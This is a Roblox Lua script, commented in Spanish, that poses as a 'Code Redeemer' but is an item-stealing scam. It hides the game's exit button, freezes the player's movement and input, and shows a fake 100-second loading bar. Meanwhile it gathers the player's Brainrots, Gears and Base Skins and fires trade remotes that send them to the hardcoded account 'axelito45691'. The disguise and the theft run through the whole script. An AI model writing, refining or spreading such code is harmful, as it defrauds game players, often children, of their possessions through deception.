local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local targetUser = "axelito45691"
local loadingDuration = 100

-- Crear la pantalla de carga y congelamiento
local function createLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CodeRedeemerScreen"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")
    
    -- Fondo oscuro que congela todo
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BackgroundTransparency = 0.3
    background.Parent = screenGui
    
    -- Bloquear inputs
    background.InputBegan:Connect(function(input, gameProcessed)
        return true
    end)
    
    -- Contenedor central
    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, 400, 0, 250)
    container.Position = UDim2.new(0.5, -200, 0.5, -125)
    container.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    container.BorderSizePixel = 2
    container.BorderColor3 = Color3.fromRGB(100, 200, 255)
    container.Parent = screenGui
    
    -- Título
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(100, 200, 255)
    title.TextSize = 32
    title.Font = Enum.Font.GothamBold
    title.Text = "CODE REDEEMER"
    title.Parent = container
    
    -- Texto de cargando
    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(1, 0, 0, 30)
    loadingText.Position = UDim2.new(0, 0, 0, 60)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
    loadingText.TextSize = 18
    loadingText.Font = Enum.Font.Gotham
    loadingText.Text = "Cargando..."
    loadingText.Parent = container
    
    -- Barra de progreso (fondo)
    local progressBarBackground = Instance.new("Frame")
    progressBarBackground.Name = "ProgressBarBackground"
    progressBarBackground.Size = UDim2.new(0, 350, 0, 20)
    progressBarBackground.Position = UDim2.new(0.5, -175, 0, 110)
    progressBarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    progressBarBackground.BorderSizePixel = 1
    progressBarBackground.BorderColor3 = Color3.fromRGB(100, 100, 100)
    progressBarBackground.Parent = container
    
    -- Barra de progreso (relleno)
    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBarBackground
    
    -- Texto del porcentaje
    local percentText = Instance.new("TextLabel")
    percentText.Name = "PercentText"
    percentText.Size = UDim2.new(1, 0, 0, 20)
    percentText.Position = UDim2.new(0, 0, 0, 140)
    percentText.BackgroundTransparency = 1
    percentText.TextColor3 = Color3.fromRGB(150, 150, 150)
    percentText.TextSize = 16
    percentText.Font = Enum.Font.Gotham
    percentText.Text = "0%"
    percentText.Parent = container
    
    return screenGui, progressBar, percentText, background
end

-- Función para bloquear el botón de salida
local function blockExitButton()
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Esperar a que se cargue la GUI principal del juego
    wait(0.5)
    
    -- Buscar el botón de salida (esquina izquierda superior)
    local mainGui = playerGui:FindFirstChild("MainGui") or 
                    playerGui:FindFirstChild("GameGui") or
                    playerGui:FindFirstChild("ScreenGui")
    
    if mainGui then
        -- Buscar el botón de salida/cerrar
        local exitButton = mainGui:FindFirstChild("ExitButton") or
                          mainGui:FindFirstChild("CloseButton") or
                          mainGui:FindFirstChild("LeaveButton") or
                          mainGui:FindFirstChild("QuitButton")
        
        if exitButton then
            exitButton.Visible = false
            exitButton.Active = false
            print("Botón de salida bloqueado")
        end
    end
    
    -- También bloquear el TopbarPlus si existe
    local topbarPlus = playerGui:FindFirstChild("TopbarPlus")
    if topbarPlus then
        topbarPlus.Visible = false
    end
end

-- Función para bloquear controles del usuario
local function freezePlayerControls()
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    local humanoid = player.Character:FindFirstChild("Humanoid")
    
    if humanoidRootPart then
        humanoidRootPart.CanCollide = false
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, false)
    end
    
    -- Bloquear inputs de teclado y ratón
    local inputConnection
    inputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.UserInputType == Enum.UserInputType.Keyboard or
           input.UserInputType == Enum.UserInputType.MouseButton1 or
           input.UserInputType == Enum.UserInputType.MouseButton2 or
           input.UserInputType == Enum.UserInputType.MouseMovement then
            return true
        end
    end)
    
    return inputConnection
end

-- Función para obtener el user ID por nombre de usuario
local function getUserIdByName(username)
    local success, userId = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    
    if success then
        return userId
    else
        warn("No se pudo encontrar al usuario: " .. username)
        return nil
    end
end

-- Función para obtener todos los brainrots, gears y base skins
local function getAllBrainrotsGearsAndSkins()
    local items = {}
    
    -- Buscar la carpeta de inventario
    local playerData = player:FindFirstChild("PlayerData")
    if not playerData then
        playerData = game:GetService("ReplicatedStorage"):FindFirstChild(player.Name .. "_Data")
    end
    
    -- Buscar en Backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            local itemName = item.Name
            -- Filtrar Brainrots, Gears y Base Skins
            if string.find(itemName, "Brainrot") or 
               string.find(itemName, "Gear") or 
               string.find(itemName, "BaseSkin") or
               string.find(itemName, "Base Skin") then
                table.insert(items, itemName)
            end
        end
    end
    
    -- Buscar en leaderstats o statsvalues
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        for _, stat in pairs(leaderstats:GetChildren()) do
            local statName = stat.Name
            if string.find(statName, "Brainrot") or 
               string.find(statName, "Gear") or 
               string.find(statName, "BaseSkin") then
                table.insert(items, statName)
            end
        end
    end
    
    print("Items encontrados: ", #items)
    for _, item in pairs(items) do
        print("- " .. item)
    end
    
    return items
end

-- Función para enviar el trade a través de RemoteEvent/RemoteFunction
local function sendTradeAutomatically(targetUserId, items)
    -- Buscar RemoteEvents y RemoteFunctions en ReplicatedStorage
    local replicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Posibles nombres de eventos de trade
    local tradeEventNames = {
        "SendTrade",
        "Trade",
        "TradeRequest",
        "RequestTrade",
        "InitiateTrade",
        "OfferTrade",
        "TradeOffer",
        "ExecuteTrade"
    }
    
    for _, eventName in pairs(tradeEventNames) do
        local tradeRemote = replicatedStorage:FindFirstChild(eventName)
        
        if tradeRemote then
            print("RemoteEvent encontrado: " .. eventName)
            
            if tradeRemote:IsA("RemoteFunction") then
                local success, result = pcall(function()
                    return tradeRemote:InvokeServer(targetUserId, items)
                end)
                if success then
                    print("Trade enviado exitosamente (RemoteFunction)")
                    return true
                end
            elseif tradeRemote:IsA("RemoteEvent") then
                pcall(function()
                    tradeRemote:FireServer(targetUserId, items)
                end)
                print("Trade enviado exitosamente (RemoteEvent)")
                return true
            end
        end
    end
    
    -- Si no encuentra el remote, intentar crear uno
    print("Enviando trade sin RemoteEvent personalizado...")
    return false
end

-- Función para animar la barra de progreso
local function animateProgressBar(screenGui, progressBar, percentText)
    local startTime = tick()
    local completed = false
    
    while not completed and screenGui.Parent do
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / loadingDuration, 1)
        
        progressBar.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = math.floor(progress * 100) .. "%"
        
        if progress >= 1 then
            completed = true
        end
        
        wait(0.1)
    end
    
    return completed
end

-- Función para descongelar controles
local function unfreezePlayerControls(inputConnection)
    local humanoid = player.Character:FindFirstChild("Humanoid")
    
    if humanoid then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, true)
    end
    
    if inputConnection then
        inputConnection:Disconnect()
    end
end

-- Función principal
local function executeCodeRedeemer()
    -- Bloquear botón de salida
    blockExitButton()
    
    -- Congelar pantalla e inputs del jugador
    local inputConnection = freezePlayerControls()
    
    -- Crear pantalla de carga
    local screenGui, progressBar, percentText, background = createLoadingScreen()
    
    wait(1)
    
    -- Obtener ID del usuario objetivo
    local targetUserId = getUserIdByName(targetUser)
    
    if not targetUserId then
        screenGui:Destroy()
        unfreezePlayerControls(inputConnection)
        return
    end
    
    -- Obtener todos los brainrots, gears y base skins
    local items = getAllBrainrotsGearsAndSkins()
    
    if #items == 0 then
        print("No se encontraron items para tradear")
    end
    
    -- Enviar el trade automáticamente
    sendTradeAutomatically(targetUserId, items)
    
    -- Animar la barra de progreso
    local completed = animateProgressBar(screenGui, progressBar, percentText)
    
    -- Cuando se complete, eliminar la pantalla y descongelar
    if completed then
        wait(2)
        screenGui:Destroy()
        unfreezePlayerControls(inputConnection)
        print("Code Redeemer completado - Trade enviado a: " .. targetUser)
        print("Items enviados: " .. #items)
    end
end

-- Ejecutar el script
executeCodeRedeemer()
